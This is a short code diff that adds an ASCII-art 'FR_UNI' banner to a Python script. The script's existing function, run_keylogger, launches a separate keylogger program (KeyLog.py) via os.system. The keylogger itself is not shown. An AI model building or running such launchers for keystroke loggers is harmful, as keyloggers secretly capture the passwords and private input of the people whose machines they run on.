@@ -1,4 +1,9 @@
 import os
+import pyfiglet
+from colorama import Fore
+
+text = pyfiglet.figlet_format("FR_UNI")
+print(Fore.BLUE + text)
 
 def run_keylogger():
     os.system('python z:scripts/FR_KeyLogger/KeyLog.py')
